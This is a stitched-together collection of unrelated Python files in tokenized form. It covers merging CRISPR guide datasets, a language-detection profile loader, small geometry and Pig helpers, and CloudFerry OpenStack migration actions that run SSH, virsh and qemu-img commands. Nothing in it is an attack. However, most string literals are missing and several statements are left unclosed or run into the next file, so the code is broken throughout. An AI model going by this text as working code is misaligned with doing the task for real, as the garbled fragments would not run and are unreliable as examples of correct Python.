target_genes = np . concatenate ( ( target_genes , target_genes_xu ) ) \n 
\n 
return Xdf , Y , gene_position , target_genes \n 
\n 
~~ def mergeV1_V2 ( data_file , data_file2 , learn_options ) : \n 
~~~ \n 
assert not learn_options [ ] , "don\'t currently have \'Strand\' column in V1 data" \n 
\n 
annotations , gene_position1 , target_genes1 , Xdf1 , Y1 = read_V1_data ( data_file , learn_options ) \n 
Xdf2 , drugs_to_genes , target_genes2 , Y2 , gene_position2 = read_V2_data ( data_file2 ) \n 
\n 
Y1 . rename ( columns = { : learn_options [ "rank-transformed target name" ] } , inplace = True ) Y1 . rename ( columns = { : learn_options [ "binary target name" ] } , inplace = True ) \n 
\n 
# rename columns, and add a dummy "drug" to V1 so can join the data sets \n 
Y1 [ "drug" ] = [ "nodrug" for x in range ( Y1 . shape [ 0 ] ) ] \n 
Y1 = Y1 . set_index ( , append = True ) \n 
Y1 . index . names = [ , , ] \n 
\n 
Y_cols_to_keep = np . unique ( [ , , , \n 
Y1 = Y1 [ Y_cols_to_keep ] \n 
Y2 = Y2 [ Y_cols_to_keep ] \n 
\n 
Xdf1 [ "drug" ] = [ "nodrug" for x in range ( Xdf1 . shape [ 0 ] ) ] \n 
Xdf1 = Xdf1 . set_index ( , append = True ) \n 
\n 
X_cols_to_keep = [ , ] \n 
Xdf1 = Xdf1 [ X_cols_to_keep ] \n 
Xdf2 = Xdf2 [ X_cols_to_keep ] \n 
\n 
gene_position1 [ "drug" ] = [ "nodrug" for x in range ( gene_position1 . shape [ 0 ] ) ] \n 
gene_position1 = gene_position1 . set_index ( , append = True ) \n 
gene_position1 . index . names = [ , , ] \n 
cols_to_keep = [ , ] \n 
gene_position1 = gene_position1 [ cols_to_keep ] \n 
gene_position2 = gene_position2 [ cols_to_keep ] \n 
\n 
Y = pandas . concat ( ( Y1 , Y2 ) , axis = 0 ) \n 
Xdf = pandas . concat ( ( Xdf1 , Xdf2 ) , axis = 0 ) \n 
gene_position = pandas . concat ( ( gene_position1 , gene_position2 ) ) \n 
\n 
# target_genes = target_genes1 + target_genes2 \n 
target_genes = np . concatenate ( ( target_genes1 , target_genes2 ) ) \n 
\n 
save_to_file = False \n 
\n 
if save_to_file : \n 
~~~ Y . index . names = [ , , ] \n 
assert np . all ( Xdf . index . values == Y . index . values ) , "rows don\'t match up" \n 
\n 
onedupind = np . where ( Y . index . duplicated ( ) ) [ 0 ] [ 0 ] \n 
alldupind = np . where ( Y . index . get_level_values ( 0 ) . values == Y . index [ onedupind ] [ 0 ] ) [ 0 ] \n 
\n 
#arbitrarily set one of these to have "nodrug2" as the third level index \n 
#so that they are not repeated, and the joints therefore do not augment the data set \n 
assert len ( alldupind ) == 2 , "expected only duplicates" \n 
newindex = Y . index . tolist ( ) \n 
newindex [ onedupind ] = ( newindex [ onedupind ] [ 0 ] , newindex [ onedupind ] [ 1 ] , "nodrug2" ) \n 
Y . index = pandas . MultiIndex . from_tuples ( newindex , names = Y . index . names ) \n 
Xdf . index = pandas . MultiIndex . from_tuples ( newindex , names = Y . index . names ) \n 
\n 
# there seems to be a duplicate index, and thus this increases the data set size, so doing it the hacky way... XandY = pandas . merge ( Xdf , Y , how = "inner" , left_index = True , right_index = True ) \n 
gene_position_tmp = gene_position . copy ( ) \n 
gene_position_tmp . index . names = [ , , ] \n 
gene_position_tmp . index = pandas . MultiIndex . from_tuples ( newindex , names = Y . index . names ) \n 
XandY = pandas . merge ( XandY , gene_position_tmp , how = "inner" , left_index = True , right_index = True \n 
# truncate to 30mers \n 
XandY [ "30mer" ] = XandY [ "30mer" ] . apply ( lambda x : x [ 0 : 30 ] ) \n 
XandY . to_csv ( ) \n 
\n 
~~ return Xdf , Y , gene_position , target_genes \n 
\n 
\n 
~~ def get_V1_genes ( data_file = None ) : \n 
~~~ annotations , gene_position , target_genes , Xdf , Y = read_V1_data ( data_file , learn_options = None ) \n 
return target_genes \n 
\n 
\n 
~~ def get_V2_genes ( data_file = None ) : \n 
~~~ Xdf , drugs_to_genes , target_genes , Y , gene_position = read_V2_data ( data_file , verbose = False ) \n 
return target_genes \n 
\n 
\n 
~~ def get_V3_genes ( data_fileV1 = None , data_fileV2 = None ) : \n 
~~~ target_genes = np . concatenate ( ( get_V1_genes ( data_fileV1 ) , get_V2_genes ( data_fileV2 ) ) ) \n 
return target_genes \n 
\n 
~~ def get_xu_genes ( data_file = None ) : \n 
~~~ return read_xu_et_al ( data_file ) [ 1 ] \n 
\n 
~~ def get_mouse_genes ( data_file = None ) : \n 
~~~ annotations , gene_position , target_genes , Xdf , Y = read_V1_data ( data_file , learn_options = None ) \n 
return Xdf [ Xdf [ ] == ] [ ] . unique ( ) \n 
\n 
\n 
~~ def get_human_genes ( data_file = None ) : \n 
~~~ annotations , gene_position , target_genes , Xdf , Y = read_V1_data ( data_file , learn_options = None ) \n 
mouse_genes = Xdf [ Xdf [ ] == ] [ ] . unique ( ) \n 
all_genes = get_V3_genes ( None , None ) return np . setdiff1d ( all_genes , mouse_genes ) \n 
~~ import os \n 
from os import path \n 
import sys \n 
\n 
try : \n 
~~~ import simplejson as json \n 
~~ except ImportError : \n 
~~~ import json \n 
\n 
~~ from . detector import Detector \n 
from . lang_detect_exception import ErrorCode , LangDetectException \n 
from . utils . lang_profile import LangProfile \n 
\n 
\n 
class DetectorFactory ( object ) : \n 
~~~ \n 
seed = None \n 
\n 
def __init__ ( self ) : \n 
~~~ self . word_lang_prob_map = { } \n 
self . langlist = [ ] \n 
\n 
~~ def load_profile ( self , profile_directory ) : \n 
~~~ list_files = os . listdir ( profile_directory ) \n 
if not list_files : \n 
~~~ raise LangDetectException ( ErrorCode . NeedLoadProfileError , + profile_directory \n 
~~ langsize , index = len ( list_files ) , 0 \n 
for filename in list_files : \n 
~~~ if filename . startswith ( ) : \n 
~~~ continue \n 
~~ filename = path . join ( profile_directory , filename ) \n 
if not path . isfile ( filename ) : \n 
~~~ continue \n 
\n 
~~ f = None \n 
try : \n 
~~~ if sys . version_info [ 0 ] < 3 : \n 
~~~ f = open ( filename , ) \n 
~~ else : \n 
~~~ f = open ( filename , , encoding = ) \n 
~~ json_data = json . load ( f ) \n 
profile = LangProfile ( ** json_data ) \n 
self . add_profile ( profile , index , langsize ) \n 
index += 1 \n 
~~ except IOError : \n 
~~~ raise LangDetectException ( ErrorCode . FileLoadError , \'Cannot open "%s"\' % filename ) \n 
~~ except : \n 
~~~ raise LangDetectException ( ErrorCode . FormatError , \'Profile format error in "%s"\' % filename ~~ finally : \n 
~~~ if f : \n 
~~~ f . close ( ) \n 
\n 
~~ ~~ ~~ ~~ def load_json_profile ( self , json_profiles ) : \n 
~~~ langsize , index = len ( json_profiles ) , 0 \n 
if langsize < 2 : \n 
~~~ raise LangDetectException ( ErrorCode . NeedLoadProfileError , ) \n 
\n 
~~ for json_profile in json_profiles : \n 
~~~ try : \n 
~~~ json_data = json . loads ( json_profile ) \n 
profile = LangProfile ( ** json_data ) \n 
self . add_profile ( profile , index , langsize ) \n 
index += 1 \n 
~~ except : \n 
~~~ raise LangDetectException ( ErrorCode . FormatError , ) \n 
\n 
~~ ~~ ~~ def add_profile ( self , profile , index , langsize ) : \n 
~~~ lang = profile . name \n 
if lang in self . langlist : \n 
~~~ raise LangDetectException ( ErrorCode . DuplicateLangError , ~~ self . langlist . append ( lang ) \n 
\n 
for word in profile . freq : \n 
~~~ if word not in self . word_lang_prob_map : \n 
~~~ self . word_lang_prob_map [ word ] = [ 0.0 ] * langsize \n 
~~ length = len ( word ) \n 
if 1 <= length <= 3 : \n 
~~~ prob = 1.0 * profile . freq . get ( word ) / profile . n_words [ length - 1 ] \n 
self . word_lang_prob_map [ word ] [ index ] = prob \n 
\n 
~~ ~~ ~~ def clear ( self ) : \n 
~~~ self . langlist = [ ] \n 
self . word_lang_prob_map = { } \n 
\n 
~~ def create ( self , alpha = None ) : \n 
~~~ \n 
detector = self . _create_detector ( ) \n 
if alpha is not None : \n 
~~~ detector . set_alpha ( alpha ) \n 
~~ return detector \n 
\n 
~~ def _create_detector ( self ) : \n 
~~~ if not self . langlist : \n 
~~~ raise LangDetectException ( ErrorCode . NeedLoadProfileError , ) \n 
~~ return Detector ( self ) \n 
\n 
~~ def set_seed ( self , seed ) : \n 
~~~ self . seed = seed \n 
\n 
~~ def get_lang_list ( self ) : \n 
~~~ return list ( self . langlist ) \n 
\n 
\n 
~~ ~~ PROFILES_DIRECTORY = path . join ( path . dirname ( __file__ ) , ) \n 
_factory = None \n 
\n 
def init_factory ( ) : \n 
~~~ global _factory \n 
if _factory is None : \n 
~~~ _factory = DetectorFactory ( ) \n 
_factory . load_profile ( PROFILES_DIRECTORY ) \n 
\n 
~~ ~~ def detect ( text ) : \n 
~~~ init_factory ( ) \n 
detector = _factory . create ( ) \n 
detector . append ( text ) \n 
return detector . detect ( ) \n 
\n 
\n 
~~ def detect_langs ( text ) : \n 
~~~ init_factory ( ) \n 
detector = _factory . create ( ) \n 
detector . append ( text ) \n 
return detector . get_probabilities ( ) \n 
~~ import math \n 
\n 
\n 
def distance ( pa , pb ) : \n 
~~~ ax , ay = pa \n 
bx , by = pb \n 
return math . sqrt ( ( ax - bx ) ** 2 + ( ay - by ) ** 2 ) \n 
\n 
\n 
~~ def index_of_nearest ( p , hot_points , distance_f = distance ) : \n 
~~~ """Given a point and a set of hot points it found the hot point\n    nearest to the given point. An arbitrary distance function can\n    be specified\n    :return the index of the nearest hot points, or None if the list of hot\n            points is empty\n    """ \n 
min_dist = None \n 
nearest_hp_i = None \n 
for i , hp in enumerate ( hot_points ) : \n 
~~~ dist = distance_f ( p , hp ) \n 
if min_dist is None or dist < min_dist : \n 
~~~ min_dist = dist \n 
nearest_hp_i = i \n 
~~ ~~ return nearest_hp_i \n 
~~ from pig_util import outputSchema \n 
\n 
@ outputSchema ( ) \n 
def reverse ( word ) : \n 
~~~ """\n   Return the reverse text of the provided word\n   """ \n 
return word [ : : - 1 ] \n 
\n 
\n 
~~ @ outputSchema ( ) \n 
def num_chars ( word ) : \n 
~~~ """\n   Return the length of the provided word\n   """ \n 
return len ( word ) #!/usr/bin/env python \n 
\n 
# Copyright (c) 2016 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the License); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an AS IS BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or \n 
# implied. \n 
# See the License for the specific language governing permissions and# \n 
# limitations under the License. \n 
\n 
~~ from fabric import main as fab_main \n 
\n 
from cloudferry import fabfile \n 
\n 
\n 
def main ( ) : \n 
~~~ fab = fabfile . __file__ \n 
if fab . endswith ( ) : \n 
~~~ fab = fab [ : - 1 ] \n 
~~ fab_main . main ( [ fab ] ) \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ main ( ) \n 
# Copyright (c) 2014 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the License); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an AS IS BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or \n 
# implied. \n 
# See the License for the specific language governing permissions and# \n 
# limitations under the License. \n 
\n 
\n 
~~ from cloudferry . lib . base . action import action \n 
\n 
DEFAULT = 0 \n 
PATH_ONE = 1 \n 
PATH_TWO = 2 \n 
\n 
\n 
class IsOption ( action . Action ) : \n 
\n 
~~~ def __init__ ( self , init , option_name ) : \n 
~~~ self . option_name = option_name \n 
super ( IsOption , self ) . __init__ ( init ) \n 
\n 
~~ def run ( self , ** kwargs ) : \n 
~~~ self . set_next_path ( DEFAULT ) # DEFAULT PATH \n 
option_value = self . cfg . migrate [ self . option_name ] \n 
if option_value : \n 
~~~ self . set_next_path ( PATH_ONE ) \n 
~~ else : \n 
~~~ self . set_next_path ( PATH_TWO ) \n 
~~ return { } \n 
# Copyright (c) 2015 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the License); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an AS IS BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or \n 
# implied. \n 
# See the License for the specific language governing permissions and# \n 
# limitations under the License. \n 
\n 
\n 
~~ ~~ from cloudferry . lib . base . action import action \n 
from cloudferry . lib . utils import log \n 
from cloudferry . lib . utils import utils as utl \n 
\n 
\n 
LOG = log . getLogger ( __name__ ) \n 
\n 
\n 
class CheckConfigQuotaNeutron ( action . Action ) : \n 
~~~ """\n    Checking config quotas between src and dst clouds.\n\n    If all tenants have customs quotas then different configurations does not\n    matter.\n    """ \n 
\n 
def run ( self , ** kwargs ) : \n 
~~~ src_cloud = self . src_cloud \n 
dst_cloud = self . dst_cloud \n 
network_src = src_cloud . resources [ utl . NETWORK_RESOURCE ] \n 
identity_dst = dst_cloud . resources [ utl . IDENTITY_RESOURCE ] \n 
network_dst = dst_cloud . resources [ utl . NETWORK_RESOURCE ] \n 
\n 
search_opts_tenant = kwargs . get ( , { } ) \n 
tenants_src = self . get_src_tenants ( search_opts_tenant ) \n 
\n 
list_quotas = network_src . list_quotas ( ) \n 
tenants_without_quotas = self . get_tenants_without_quotas ( tenants_src , \n 
list_quotas ) \n 
if not tenants_without_quotas : \n 
~~~ LOG . info ( "On SRC cloud all tenants " \n 
"have custom quotas for network" ) \n 
LOG . info ( "Difference between clouds configs " \n 
"default quotas will not calculated" ) \n 
LOG . info ( "Migration can proceed" ) \n 
return \n 
~~ LOG . info ( "Checking default quota " \n 
"configuration on source and destination cloud" ) \n 
quot = network_src . show_quota ( tenants_without_quotas [ 0 ] ) \n 
dst_temp_tenant = identity_dst . create_tenant ( "Test Tenant For Quotas" ) \n 
quot_default_dst = network_dst . show_quota ( dst_temp_tenant . id ) \n 
is_configs_different = False \n 
identity_dst . delete_tenant ( dst_temp_tenant ) \n 
for item_quot , val_quot in quot . iteritems ( ) : \n 
~~~ if val_quot != quot_default_dst [ item_quot ] : \n 
~~~ is_configs_different = True \n 
LOG . info ( "Item %s in quotas is different (SRC CLOUD: %s, " \n 
"DST CLOUD: %s)" , item_quot , val_quot , \n 
quot_default_dst [ item_quot ] ) \n 
~~ ~~ if not is_configs_different : \n 
~~~ LOG . info ( "Configs on clouds is equals" ) \n 
\n 
~~ ~~ @ staticmethod \n 
def get_tenants_without_quotas ( tenants_src , list_quotas ) : \n 
~~~ tenants_ids = tenants_src . keys ( ) \n 
quotas_ids_tenants = [ quota [ "tenant_id" ] for quota in list_quotas ] \n 
return list ( set ( tenants_ids ) - set ( quotas_ids_tenants ) ) \n 
\n 
~~ def get_src_tenants ( self , search_opts ) : \n 
~~~ identity_src = self . src_cloud . resources [ utl . IDENTITY_RESOURCE ] \n 
\n 
if search_opts . get ( ) : \n 
~~~ filter_tenants_ids_list = search_opts [ ] \n 
tenants = [ identity_src . keystone_client . tenants . find ( id = tnt_id ) for \n 
tnt_id in filter_tenants_ids_list ] \n 
~~ else : \n 
~~~ tenants = identity_src . get_tenants_list ( ) \n 
\n 
~~ tenants_dict = { tenant . id : tenant . name for tenant in tenants } \n 
\n 
return tenants_dict \n 
# Copyright (c) 2015 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the License); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an AS IS BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or \n 
# implied. \n 
# See the License for the specific language governing permissions and# \n 
# limitations under the License. \n 
\n 
~~ ~~ import copy \n 
import logging \n 
\n 
from oslo_config import cfg \n 
\n 
from cloudferry . lib . base . action import action \n 
from cloudferry . lib . utils import utils \n 
\n 
CONF = cfg . CONF \n 
LOG = logging . getLogger ( __name__ ) \n 
\n 
\n 
class DetachVolumesCompute ( action . Action ) : \n 
\n 
~~~ def run ( self , info , ** kwargs ) : \n 
~~~ info = copy . deepcopy ( info ) \n 
compute_resource = self . cloud . resources [ utils . COMPUTE_RESOURCE ] \n 
storage_resource = self . cloud . resources [ utils . STORAGE_RESOURCE ] \n 
for instance in info [ utils . INSTANCES_TYPE ] . itervalues ( ) : \n 
~~~ LOG . info ( "Detaching volumes for instance %s [%s]" , \n 
instance [ ] [ ] , instance [ ] [ ] ) \n 
if not instance [ ] [ utils . VOLUMES_TYPE ] : \n 
~~~ continue \n 
~~ for vol in instance [ ] [ utils . VOLUMES_TYPE ] : \n 
~~~ volume_status = storage_resource . get_status ( vol [ ] ) \n 
LOG . debug ( "Volume %s was found. Status %s" , \n 
vol [ ] , volume_status ) \n 
if volume_status == : \n 
~~~ compute_resource . detach_volume ( instance [ ] [ ] , \n 
vol [ ] ) \n 
LOG . debug ( "Detach volume %s" , vol [ ] ) \n 
timeout = CONF . migrate . storage_backend_timeout \n 
storage_resource . wait_for_status ( \n 
vol [ ] , storage_resource . get_status , , \n 
timeout = timeout ) \n 
~~ ~~ ~~ return { } \n 
# Copyright (c) 2014 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the License); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an AS IS BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or \n 
# implied. \n 
# See the License for the specific language governing permissions and# \n 
# limitations under the License. \n 
\n 
\n 
~~ ~~ from cloudferry . lib . base . action import action \n 
from cloudferry . lib . utils . ssh_util import SshUtil \n 
\n 
\n 
class RemoteExecution ( action . Action ) : \n 
\n 
~~~ def __init__ ( self , cloud , host = None , int_host = None , config_migrate = None ) : \n 
~~~ self . cloud = cloud \n 
self . host = host \n 
self . int_host = int_host \n 
self . config_migrate = config_migrate \n 
self . remote_exec_obj = SshUtil ( self . cloud , \n 
self . config_migrate , \n 
self . host ) \n 
super ( RemoteExecution , self ) . __init__ ( { } ) \n 
\n 
~~ def run ( self , command , ** kwargs ) : \n 
~~~ self . remote_exec_obj . execute ( command , self . int_host ) \n 
return { } \n 
# Copyright 2015 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
~~ ~~ import json \n 
import os \n 
\n 
from xml . etree import ElementTree \n 
\n 
from cloudferry . lib . utils import log \n 
\n 
LOG = log . getLogger ( __name__ ) \n 
\n 
nova_instances_path = "/var/lib/nova/instances/" \n 
\n 
\n 
def instance_path ( instance_id ) : \n 
~~~ return os . path . join ( nova_instances_path , instance_id ) \n 
\n 
\n 
~~ def instance_image_path ( instance_id ) : \n 
~~~ return os . path . join ( instance_path ( instance_id ) , "disk" ) \n 
\n 
\n 
~~ def _qemu_img_rebase ( src , dst ) : \n 
~~~ return "qemu-img rebase -b {src} {dst}" . format ( src = src , dst = dst ) \n 
\n 
\n 
~~ class QemuBackingFileMover ( object ) : \n 
~~~ def __init__ ( self , runner , src , instance_id ) : \n 
~~~ self . runner = runner \n 
self . src = src \n 
self . dst = instance_image_path ( instance_id ) \n 
\n 
~~ def __enter__ ( self ) : \n 
~~~ cmd = _qemu_img_rebase ( self . src , self . dst ) \n 
self . runner . run ( cmd ) \n 
return self \n 
\n 
~~ def __exit__ ( self , exc_type , exc_val , exc_tb ) : \n 
~~~ cmd = _qemu_img_rebase ( self . dst , self . src ) \n 
self . runner . run_ignoring_errors ( cmd ) \n 
return self \n 
\n 
\n 
~~ ~~ class DestNovaInstanceDestroyer ( object ) : \n 
~~~ """Fake instance is destroyed from libvirt as part of live migration. In\n    case something fails during live migration, this action must be rolled\n    back. The only valid rollback scenario is to delete the same instance from\n    nova DB.""" \n 
\n 
def __init__ ( self , dest_libvirt , dest_nova , libvirt_name , nova_vm_id ) : \n 
~~~ self . dest_libvirt = dest_libvirt \n 
self . dest_nova = dest_nova \n 
self . libvirt_name = libvirt_name \n 
self . nova_vm_id = nova_vm_id \n 
\n 
~~ def __enter__ ( self ) : \n 
~~~ self . do ( ) \n 
\n 
~~ def __exit__ ( self , exc_type , exc_val , exc_tb ) : \n 
~~~ self . undo ( ) \n 
\n 
~~ def do ( self ) : \n 
~~~ self . dest_libvirt . destroy_vm ( self . libvirt_name ) \n 
\n 
~~ def undo ( self ) : \n 
~~~ try : \n 
~~~ LOG . debug ( "Rolling back fake VM %s" , self . nova_vm_id ) \n 
self . dest_nova . reset_state ( self . nova_vm_id ) \n 
self . dest_nova . delete_vm_by_id ( self . nova_vm_id ) \n 
~~ except RuntimeError : \n 
\n 
~~~ pass \n 
\n 
\n 
~~ ~~ ~~ class Libvirt ( object ) : \n 
~~~ def __init__ ( self , remote_runner ) : \n 
~~~ """\n        :remote_runner: `cloudferry.lib.utils.remote_runner.RemoteRunner`\n                        object\n        """ \n 
self . runner = remote_runner \n 
\n 
~~ def get_backing_file ( self , instance_id ) : \n 
~~~ cmd = ( "qemu-img info {image_path} --output json" . format ( \n 
image_path = instance_image_path ( instance_id ) ) ) \n 
\n 
try : \n 
~~~ image_info = json . loads ( self . runner . run ( cmd ) ) \n 
return image_info [ ] \n 
~~ except ( ValueError , TypeError ) as e : \n 
~~~ LOG . error ( "Invalid value received from qemu: %s!" , e ) \n 
~~ except KeyError : \n 
~~~ LOG . warning ( "Instance \'%s\' does not have backing file associated!" , \n 
instance_id ) \n 
\n 
~~ ~~ def get_xml ( self , libvirt_instance_name ) : \n 
~~~ cmd = ( "virsh dumpxml {inst_name}" . format ( \n 
inst_name = libvirt_instance_name ) ) \n 
\n 
return LibvirtXml ( self . runner . run ( cmd ) ) \n 
\n 
~~ def destroy_vm ( self , libvirt_instance_name ) : \n 
~~~ cmds = [ \n 
"virsh destroy {instance}" . format ( instance = libvirt_instance_name ) , \n 
"virsh undefine {instance}" . format ( instance = libvirt_instance_name ) \n 
] \n 
for cmd in cmds : \n 
~~~ self . runner . run ( cmd ) \n 
\n 
~~ ~~ def move_backing_file ( self , source_file , instance_id ) : \n 
~~~ cmd = _qemu_img_rebase ( src = source_file , \n 
dst = instance_image_path ( instance_id ) ) \n 
self . runner . run ( cmd ) \n 
\n 
~~ def live_migrate ( self , libvirt_instance_name , dest_host , migration_xml ) : \n 
~~~ cmd = ( "virsh migrate --live --copy-storage-all --verbose {instance} " \n 
"qemu+tcp://{dst_host}/system " \n 
"--xml {migration_xml}" . format ( instance = libvirt_instance_name , \n 
dst_host = dest_host , \n 
migration_xml = migration_xml ) ) \n 
self . runner . run ( cmd ) \n 
\n 
\n 
~~ ~~ class LibvirtDeviceInterfaceHwAddress ( object ) : \n 
~~~ def __init__ ( self , element ) : \n 
~~~ self . type = element . get ( ) \n 
self . domain = element . get ( ) \n 
self . bus = element . get ( ) \n 
self . slot = element . get ( ) \n 
self . function = element . get ( ) \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return "HW Address<%s %s %s>" % ( self . type , self . bus , self . slot ) \n 
\n 
~~ def __eq__ ( self , other ) : \n 
~~~ return ( isinstance ( other , self . __class__ ) and \n 
self . type == other . type and \n 
self . domain == other . domain and \n 
self . bus == other . bus and \n 
self . slot == other . slot and \n 
self . function == other . function ) \n 
\n 
\n 
~~ ~~ class LibvirtDeviceInterface ( object ) : \n 
~~~ def __init__ ( self , interface ) : \n 
~~~ """\n        :interface: - `xml.etree.ElementTree.Element` object\n        """ \n 
self . _xml_element = interface \n 
self . mac = interface . find ( ) . get ( ) \n 
self . source_iface = interface . find ( ) . get ( ) \n 
self . target_iface = interface . find ( ) . get ( ) \n 
self . hw_address = LibvirtDeviceInterfaceHwAddress ( \n 
interface . find ( ) ) \n 
\n 
~~ def __eq__ ( self , other ) : \n 
~~~ return ( isinstance ( other , self . __class__ ) and \n 
self . source_iface == other . source_iface and \n 
self . target_iface == other . target_iface and \n 
self . hw_address == other . hw_address ) \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return "Iface<mac={mac}, src={src}, dst={dst}>" . format ( \n 
mac = self . mac , src = self . source_iface , dst = self . target_iface ) \n 
\n 
~~ @ classmethod \n 
def _replace_attr ( cls , element , attr , value ) : \n 
~~~ if element . get ( attr ) != value : \n 
~~~ element . clear ( ) \n 
element . attrib = { attr : value } \n 
\n 
~~ ~~ def element ( self ) : \n 
~~~ source = self . _xml_element . find ( ) \n 
target = self . _xml_element . find ( ) \n 
\n 
self . _replace_attr ( source , , self . source_iface ) \n 
self . _replace_attr ( target , , self . target_iface ) \n 
\n 
return self . _xml_element \n 
\n 
\n 
~~ ~~ class LibvirtXml ( object ) : \n 
~~~ def __init__ ( self , contents ) : \n 
~~~ """\n        :contents - XML file contents (text)\n        """ \n 
self . _xml = ElementTree . fromstring ( contents ) \n 
self . _interfaces = [ LibvirtDeviceInterface ( i ) \n 
for i in self . _xml . findall ( ) ] \n 
self . disk_file = self . _get ( , ) \n 
self . serial_file = self . _get ( , ) \n 
self . console_file = self . _get ( , ) \n 
\n 
~~ def _get ( self , element , attribute ) : \n 
~~~ el = self . _xml . find ( element ) \n 
if el is not None : \n 
~~~ return el . get ( attribute ) \n 
\n 
~~ ~~ def _set ( self , element , attribute , value ) : \n 
~~~ el = self . _xml . find ( element ) \n 
if el is not None : \n 
~~~ el . set ( attribute , value ) \n 
\n 
~~ ~~ @ property \n 
def interfaces ( self ) : \n 
~~~ return self . _interfaces \n 
\n 
~~ @ interfaces . setter \n 
def interfaces ( self , other ) : \n 
~~~ """Only <source bridge/> and <target dev/> elements must be updated""" \n 
if len ( self . interfaces ) != len ( other ) : \n 
~~~ raise RuntimeError ( "Source and dest have different number of " \n 
"network interfaces allocated." ) \n 
\n 
~~ for other_iface in other : \n 
~~~ for this_iface in self . interfaces : \n 
~~~ identical = ( this_iface . mac == other_iface . mac ) \n 
if identical : \n 
~~~ this_iface . source_iface = other_iface . source_iface \n 
this_iface . target_iface = other_iface . target_iface \n 
break \n 
\n 
~~ ~~ ~~ ~~ def dump ( self ) : \n 
~~~ self . _set ( , , self . disk_file ) \n 
self . _set ( , , self . serial_file ) \n 
self . _set ( , , self . console_file ) \n 
\n 
xml_devices = self . _xml . find ( ) \n 
xml_interfaces = self . _xml . findall ( ) \n 
for iface in xml_interfaces : \n 
~~~ xml_devices . remove ( iface ) \n 
\n 
~~ for iface in self . _interfaces : \n 
~~~ xml_devices . append ( iface . element ( ) ) \n 
\n 
~~ return ElementTree . tostring ( self . _xml ) \n 
# Copyright 2016 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ import abc \n 
\n 
from cloudferry . lib . utils import files \n 
from cloudferry . lib . utils import remote_runner \n 
from cloudferry . lib . copy_engines import base \n 
\n 
\n 
class CopyFailed ( RuntimeError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class CopyMechanism ( object ) : \n 
~~~ __metaclass__ = abc . ABCMeta \n 
\n 
@ abc . abstractmethod \n 
def copy ( self , context , source_object , destination_object ) : \n 
~~~ raise NotImplementedError ( ) \n 
\n 
\n 
~~ ~~ class CopyObject ( object ) : \n 
~~~ def __init__ ( self , host = None , path = None ) : \n 
~~~ self . host = host \n 
self . path = path \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return "{host}:{path}" . format ( host = self . host , path = self . path ) \n 
\n 
\n 
~~ ~~ class RemoteFileCopy ( CopyMechanism ) : \n 
~~~ """Uses one of `rsync`, `bbcp` or `scp` to copy volume files across remote\n    nodes. Primarily used for NFS backend.""" \n 
\n 
def copy ( self , context , source_object , destination_object ) : \n 
~~~ data = { \n 
: source_object . host , \n 
: source_object . path , \n 
: destination_object . host , \n 
: destination_object . path \n 
} \n 
\n 
try : \n 
~~~ copier = base . get_copier ( context . src_cloud , \n 
context . dst_cloud , \n 
data ) \n 
\n 
copier . transfer ( data ) \n 
~~ except ( base . FileCopyError , \n 
base . CopierCannotBeUsed , \n 
base . CopierNotFound ) as e : \n 
~~~ msg = ( "Copying file from {src_host}@{src_file} to " \n 
"{dst_host}@{dst_file}, error: {err}" ) . format ( \n 
src_host = source_object . host , \n 
src_file = source_object . path , \n 
dst_host = destination_object . host , \n 
dst_file = destination_object . path , \n 
err = e . message ) \n 
raise CopyFailed ( msg ) \n 
\n 
\n 
~~ ~~ ~~ class CopyRegularFileToBlockDevice ( CopyMechanism ) : \n 
~~~ """Redirects regular file to stdout and copies over ssh tunnel to calling\n    node into block device""" \n 
